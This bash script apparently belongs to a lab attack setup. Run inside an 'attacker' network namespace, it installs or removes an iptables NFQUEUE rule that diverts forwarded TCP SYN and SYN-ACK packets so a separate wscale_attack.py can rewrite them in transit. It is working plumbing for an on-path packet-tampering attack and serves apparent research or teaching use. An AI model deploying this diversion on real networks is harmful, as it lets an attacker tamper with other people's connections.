#!/usr/bin/env bash
# Implementation Plan step 3 ("Divert"): send forwarded SYN/SYN-ACK packets to NFQUEUE
# so wscale_attack.py can rewrite them before they continue to the real destination.
# --queue-bypass makes iptables fail OPEN (packets pass through untouched) if no
# listener is bound to the queue, instead of stalling the connection.
#
# Run inside the attacker network namespace:
#   ip netns exec wscale-attacker bash attacker/divert_rules.sh setup
#   ip netns exec wscale-attacker bash attacker/divert_rules.sh teardown
set -euo pipefail
ACTION="${1:?usage: divert_rules.sh setup|teardown}"

RULE=(-t mangle -A FORWARD -p tcp --tcp-flags SYN SYN -j NFQUEUE --queue-num 0 --queue-bypass)

if [[ "$ACTION" == "setup" ]]; then
    iptables "${RULE[@]}"
    echo "[*] NFQUEUE divert rule installed (mangle/FORWARD, queue 0, fail-open)"
elif [[ "$ACTION" == "teardown" ]]; then
    DEL_RULE=(-t mangle -D FORWARD -p tcp --tcp-flags SYN SYN -j NFQUEUE --queue-num 0 --queue-bypass)
    iptables "${DEL_RULE[@]}" || true
    echo "[*] NFQUEUE divert rule removed"
else
    echo "unknown action: $ACTION" >&2
    exit 1
fi
